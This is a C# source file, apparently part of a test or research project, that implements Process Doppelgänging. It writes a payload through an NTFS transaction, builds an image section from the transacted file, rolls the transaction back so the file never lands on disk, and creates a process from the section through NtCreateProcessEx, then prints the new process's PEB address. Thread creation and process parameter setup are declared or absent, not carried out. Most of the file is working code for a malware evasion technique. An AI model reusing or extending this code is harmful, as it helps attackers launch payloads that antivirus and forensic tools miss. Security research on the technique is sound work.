using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using static Tests.Structures;
using static Tests.TestClass;

namespace Tests
{
    internal sealed class ProcessDoppelganging
    {

        private const int INVALID_HANDLE_VALUE = -1;

        [StructLayout(LayoutKind.Sequential)]
        internal struct SECURITY_ATTRIBUTES
        {
            internal int nLength;
            internal IntPtr lpSecurityDescriptor;
            internal int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [Flags]
        private enum FILE_SHARE : uint
        {
            FILE_SHARE_NONE = 0x00,
            FILE_SHARE_READ = 0x01,
            FILE_SHARE_WRITE = 0x02,
            FILE_SHARE_DELETE = 0x04
        }

        [Flags]
        private enum FILE_MODE : uint
        {
            CREATE_NEW = 1,
            CREATE_ALWAYS = 2,
            OPEN_EXISTING = 3,
            OPEN_ALWAYS = 4,
            TRUNCATE_EXISTING = 5
        }

        [Flags]
        private enum FILE_ACCESS : uint
        {
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ktmw32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateTransaction([In] ref SECURITY_ATTRIBUTES lpTransactionAttributes, [In, Optional] uint UOW, [In, Optional] uint CreateOptions, [In, Optional] uint IsolationLevel, [In, Optional] uint IsolationFlags, [In, Optional] uint Timeout, [In, Optional] string Description);

        [DllImport("ktmw32.dll", SetLastError = true)]
        private static extern bool RollbackTransaction([In] IntPtr TransactionHandle);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] [In] string lpFileName, [In] FILE_ACCESS dwDesiredAccess, [In] FILE_SHARE dwShareMode, [In] ref SECURITY_ATTRIBUTES lpSecurityAttributes, [In] FILE_MODE dwCreationDisposition, [In] uint dwFlagsAndAttributes, [In, Optional] IntPtr hTemplateFile, [In] IntPtr hTransaction, [Optional] IntPtr pusMiniVersion, IntPtr lpExtendedParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile([In] IntPtr hFile, [In] byte[] lpBuffer, [In] uint nNumberOfBytesToWrite, [Out, Optional] out int lpNumberOfBytesWritten, [In, Out, Optional] IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle([In] IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateSection([Out] out IntPtr SectionHandle, [In] uint DesiredAccess, [In, Optional] IntPtr ObjectAttributes, [In, Optional] uint MaximumSize, [In] uint SectionPageProtection, [In] uint AllocationAttributes, [In, Optional] IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateProcessEx([Out] out IntPtr ProcessHandle, [In] uint DesiredAccess, [In, Optional] IntPtr ObjectAttributes, [In] IntPtr ParentProcess, [In] uint Flags, [In, Optional] IntPtr SectionHandle, [In, Optional] IntPtr DebugPort, [In, Optional] IntPtr ExceptionPort, [In] bool InJob);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateThreadEx(out IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] uint ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, [In] uint ProcessInformationLength, [Out, Optional] UIntPtr ReturnLength);
         
        private static IntPtr make_transacted_section(byte[] payload)
        {
            uint isolationLvl, isolationFlags, timeout;
            var options = isolationLvl = isolationFlags = timeout = 0;

            var securityAttributes = new SECURITY_ATTRIBUTES();

            var hTransaction = CreateTransaction(ref securityAttributes, 0, options, isolationLvl, isolationFlags, timeout, null);

            if (hTransaction == (IntPtr) (-1))
            {
                return PrintError("CreateTransaction");
            }

            Console.WriteLine("hTransaction: " + hTransaction);

            var dummy_name = Utils.Random.Next(int.MinValue, int.MaxValue).ToString();

            var hTransactedWriter = CreateFileTransactedW(dummy_name, FILE_ACCESS.GENERIC_WRITE, FILE_SHARE.FILE_SHARE_READ, ref securityAttributes, FILE_MODE.CREATE_ALWAYS, 0x80, IntPtr.Zero, hTransaction, IntPtr.Zero, IntPtr.Zero);

            if (hTransactedWriter == (IntPtr) (-1))
            {
                return PrintError("CreateFileTransactedW");
            }

            Console.WriteLine("hTransactedWriter: " + hTransactedWriter);

            if (!WriteFile(hTransactedWriter, payload, (uint) payload.Length, out _ /* [Optional] Skipping*/))
            {
                return PrintError("WriteFile");
            }

            CloseHandle(hTransactedWriter);

            var hTransactedReader = CreateFileTransactedW(dummy_name, FILE_ACCESS.GENERIC_READ, FILE_SHARE.FILE_SHARE_WRITE, ref securityAttributes, FILE_MODE.OPEN_EXISTING, 0x80, IntPtr.Zero, hTransaction, IntPtr.Zero, IntPtr.Zero);

            if (hTransactedReader == (IntPtr)(-1))
            {
                return PrintError("CreateFileTransactedW {2}");
            }

            Console.WriteLine("hTransactedReader: " + hTransactedReader);

            var status = NtCreateSection(out var hSection, 0x0008, IntPtr.Zero, 0, 0x02, 0x01000000, hTransactedReader);

            if (status != 0)
            {
                Console.WriteLine("0x" + status.ToString("X"));
                return PrintError("NtCreateSection");
            }

            Console.WriteLine("hSection: " + hSection);

            CloseHandle(hTransactedReader);

            if (!RollbackTransaction(hTransaction))
            {
                return PrintError("RollbackTransaction");
            }

            CloseHandle(hTransaction);

            return hSection;
        }

        internal static bool process_doppel(string targetPath, byte[] payload)
        {

            var hSection = make_transacted_section(payload);

            if (hSection == (IntPtr) INVALID_HANDLE_VALUE)
            {
                PrintError("make_transacted_section");
                return false;
            }

            var status = NtCreateProcessEx(out var hProcess, 0x000F0000 | 0x00100000 | 0xFFFF, IntPtr.Zero, Process.GetCurrentProcess().Handle, 4, hSection, IntPtr.Zero, IntPtr.Zero, false);

            if (status != 0)
            {
                PrintError("NtCreateProcessEx (0x" + status.ToString("X") + ")");
                return false;
            }

            var pi = new PROCESS_BASIC_INFORMATION();

            status = NtQueryInformationProcess(hProcess, 0, ref pi, (uint) Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

            if (status != 0)
            {
                PrintError("NtQueryInformationProcess (0x" + status.ToString("X") + ")");
                return false;
            }

            Console.WriteLine("PEB: 0x{0:X16}", pi.PebBaseAddress.ToInt32());

            return true;
        }

        private static IntPtr PrintError(string function)
        {
            Console.WriteLine("Failed to " + function + "!");
            Console.WriteLine("ErrorCode: " + Marshal.GetLastWin32Error());

            return (IntPtr) INVALID_HANDLE_VALUE;
        }

    }
}
